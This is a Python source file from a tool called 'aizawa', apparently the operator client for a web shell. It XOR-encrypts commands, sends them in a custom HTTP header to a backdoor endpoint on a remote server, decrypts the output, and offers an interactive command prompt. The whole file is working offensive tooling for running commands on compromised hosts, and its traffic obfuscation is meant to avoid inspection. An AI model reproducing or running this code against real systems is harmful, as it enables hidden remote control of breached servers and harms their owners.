"""Command execution with XOR encryption support."""

from __future__ import annotations

import sys
from typing import TYPE_CHECKING

from aizawa.utils.terminal import TerminalColors

if TYPE_CHECKING:
    from aizawa.http.client import AsyncHttpClient


class CommandExecutor:
    """Execute encrypted commands through HTTP headers."""

    @staticmethod
    def encrypt_with_xor(plaintext: str, encryption_key: str) -> str:
        """Encrypt data using XOR cipher with the given key.

        Args:
            plaintext: Data to encrypt.
            encryption_key: Encryption key for XOR operation.

        Returns:
            Hex-encoded encrypted string.

        """
        encrypted_chars = [
            chr(ord(plaintext[i]) ^ ord(encryption_key[i % len(encryption_key)]))
            for i in range(len(plaintext))
        ]
        return "".join(f"{ord(char):02x}" for char in encrypted_chars)

    @staticmethod
    def decrypt_with_xor(ciphertext: str, decryption_key: str) -> str:
        """Decrypt XOR-encrypted hex string.

        Args:
            ciphertext: Hex-encoded encrypted data.
            decryption_key: Decryption key for XOR operation.

        Returns:
            Decrypted plaintext string.

        """
        encrypted_chars = [
            chr(int(ciphertext[i : i + 2], 16)) for i in range(0, len(ciphertext), 2)
        ]
        encrypted_str = "".join(encrypted_chars)
        return "".join(
            chr(ord(encrypted_str[i]) ^ ord(decryption_key[i % len(decryption_key)]))
            for i in range(len(encrypted_str))
        )

    @staticmethod
    async def run_command(
        client: AsyncHttpClient,
        url: str,
        command: str,
        shell_type: str,
        key: str,
    ) -> str | None:
        """Execute a command on the remote shell.

        Args:
            client: HTTP client for requests.
            url: Target shell URL.
            command: Command to execute.
            shell_type: Type of shell endpoint.
            key: Encryption key for secure transmission.

        Returns:
            Command output if successful, None otherwise.

        """
        if not shell_type.startswith("http_aizawa_ninja"):
            return None

        encrypted_cmd = (
            CommandExecutor.encrypt_with_xor(f"system~{command}", key)
            if shell_type == "http_aizawa_ninja_eval"
            else CommandExecutor.encrypt_with_xor(command, key)
        )

        headers = {"Aizawa-Ninja": encrypted_cmd}
        result = await client.send_request("GET", url, headers=headers)

        if not result:
            return f"{TerminalColors.RED}ERROR{TerminalColors.CLEAR}"

        if all(c in "0123456789abcdefABCDEF" for c in result.strip()):
            try:
                return CommandExecutor.decrypt_with_xor(result, key)
            except ValueError:
                return result

        return result

    @staticmethod
    async def interactive_shell(
        client: AsyncHttpClient,
        url: str,
        shell_type: str,
        username: str,
        hostname: str,
        working_dir: str,
        key: str,
    ) -> None:
        """Run interactive command shell with styled prompt.

        Args:
            client: HTTP client for requests.
            url: Target shell URL.
            shell_type: Type of shell endpoint.
            username: Current user name.
            hostname: Current hostname.
            working_dir: Current working directory.
            key: Encryption key for commands.

        """
        while True:
            prompt = (
                f"\n{TerminalColors.BOLD}{TerminalColors.YELLOW}{username}{TerminalColors.CLEAR}@"
                f"{TerminalColors.BOLD}{TerminalColors.BLUE}{hostname}{TerminalColors.CLEAR} "
                f"{TerminalColors.PURPLE}{working_dir}{TerminalColors.CLEAR} % "
            )
            cmd = input(prompt)

            if cmd in {"exit", "quit", "\x03"}:
                sys.exit(
                    print(
                        f"{TerminalColors.BOLD}{TerminalColors.RED}Exiting...{TerminalColors.CLEAR}",
                    ),
                )

            if not cmd:
                continue

            result = await CommandExecutor.run_command(
                client, url, cmd, shell_type, key,
            )
            print(f"\n{TerminalColors.CYAN}{result}{TerminalColors.CLEAR}")
